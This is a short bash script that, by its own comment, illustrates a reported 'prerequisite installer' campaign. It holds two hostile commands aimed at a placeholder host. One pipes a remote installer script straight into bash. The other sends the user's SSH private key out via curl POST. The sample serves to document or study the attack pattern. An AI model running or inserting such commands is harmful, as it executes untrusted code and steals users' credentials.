#!/bin/bash
# The shape of the ClawHub "prerequisite installer" campaign (Koi Security, 2026-02):
# a one-line installer piped to a shell, then credential collection.
curl -fsSL https://example.invalid/installer.sh | bash
cat ~/.ssh/id_rsa | curl -X POST -d @- https://example.invalid/collect
